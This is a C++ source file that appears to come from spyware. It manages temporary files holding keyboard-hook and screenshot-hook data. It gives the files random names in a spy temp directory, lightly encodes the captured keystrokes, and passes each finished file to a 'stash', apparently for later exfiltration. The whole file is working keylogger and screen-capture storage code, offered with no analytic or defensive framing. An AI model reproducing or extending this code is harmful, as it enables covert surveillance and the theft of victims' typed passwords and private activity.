#include <time.h>
#include <shlwapi.h>
#include "io.h"
#include "stash.h"

#pragma comment(lib, "Shlwapi.lib")

HOOK_FILE_HANDLE::HOOK_FILE_HANDLE(const char * filePath)
{
	// open file for write with binary mode
	handle = fopen(filePath, "w+b");
	this->filePath = new char[MAX_PATH];
	filePath = strcpy(this->filePath, filePath);
}

HOOK_FILE_HANDLE::~HOOK_FILE_HANDLE()
{
	SAFE_FREE(filePath);
	fclose(handle);
}

KBHookFile * kbHookFile = NULL;
SSHookFile * ssHookFile = NULL;

VOID get_temp_file_name(char * buffer, int len)
{
	for (int i = 0; i < len; ++i)
	{
		buffer[i] = '0' + rand() % 10;
	}
	buffer[len] = '\0';
	LOG("generate temp name: %s", buffer);
}

VOID get_temp_file_path(char * buffer)
{
	char * tempName = new char[SPY_TEMP_FILENAME_LENGTH + 1];
	get_temp_file_name(tempName, SPY_TEMP_FILENAME_LENGTH);
	PathCombineA(buffer, SPY_TEMP_DIR, tempName);
	delete[] tempName;
}

VOID close_all_files()
{
	SAFE_FREE(kbHookFile);
	SAFE_FREE(ssHookFile);
	close_stash();
}

KBHookFile * get_kbhook_file()
{
	if (kbHookFile == NULL)
	{
		kbHookFile = new KBHookFile();
	}
	else
	{
		if (kbHookFile->is_full())
		{
			delete kbHookFile;
			kbHookFile = new KBHookFile();
		}
	}
	return kbHookFile;
}

SSHookFile * get_sshook_file()
{
	if (ssHookFile == NULL)
	{
		ssHookFile = new SSHookFile();
	}
	else
	{
		if (ssHookFile->is_full())
		{
			delete ssHookFile;
			ssHookFile = new SSHookFile();
		}
	}
	return ssHookFile;
}

void force_stash_sshook_file()
{
	SAFE_FREE(ssHookFile);
}

bool HookFile::writable() const
{
	return fileHandle != NULL && fileHandle->handle != NULL;
}

#ifdef SPY_ENCODE_DATA
size_t HookFile::get_encode(const byte * in, byte * out, size_t n) const
{
	return 0;
}
#endif

void HookFile::open()
{
	// retrieve a temp file for saving hook data
	char * tempFilePath = new char[MAX_PATH];
	get_temp_file_path(tempFilePath);
	fileHandle = new HOOK_FILE_HANDLE(tempFilePath);
	LOG("hookfile >> open file '%s'", tempFilePath);
	delete[] tempFilePath;
	LOG("open file at '%s'", fileHandle->filePath);
}

void HookFile::close()
{
	SAFE_FREE(fileHandle);
	LOG("hookfile >> closed file");
}

HookFile::HookFile(const char * magic)
{
	LOG("create hook file");
	open();
	if (writable())
		write(magic, 2);
	position = 0;
}

HookFile::~HookFile()
{
	push_file(fileHandle->filePath);
	close();
}

size_t HookFile::get_position() const
{
	return position;
}

bool HookFile::is_full() const
{
	return false;
}

void HookFile::write(const void * chunk, size_t n)
{
	if (writable())
	{
		LOG("write %d element to hook file", n);
#ifdef SPY_ENCODE_DATA
		byte * out = new byte[n];
		size_t encode_n = get_encode((const byte *) chunk, out, n);
		fwrite(out, sizeof(byte), encode_n, fileHandle->handle);
		delete[] out;
#else
		fwrite(chunk, sizeof(byte), n, fileHandle->handle);
#endif
#ifdef SPY_FILE_AUTO_FLUSH
		fflush(fileHandle->handle);
		LOG("flush data!");
#endif
		position += n;
	}
}

KBHookFile::KBHookFile() : HookFile("KB")
{
}

#ifdef SPY_ENCODE_DATA
size_t KBHookFile::get_encode(const byte * in, byte * out, size_t n) const
{
	size_t currentPosition = position;
	for (size_t i = 0; i < n; ++i)
	{
		out[i] = in[i] + (currentPosition++ % 2 ? SPY_TEXT_ENCODE_SEEK_EVENNUM : SPY_TEXT_ENCODE_SEEK_ODDNUM);
	}
	return n;
}
#endif

bool KBHookFile::is_full() const
{
	return fileHandle->handle != NULL && ftell(fileHandle->handle) >= MAX_LENGTH;
}

#ifdef SPY_ENCODE_DATA
size_t SSHookFile::get_encode(const byte * in, byte * out, size_t n) const
{
	for (size_t i = 0; i < n; ++i) {
		out[i] = in[i];
	}
	return n;
}
#endif

SSHookFile::SSHookFile() : HookFile("SS")
{
}

bool SSHookFile::is_full() const
{
	return position > 0;
}
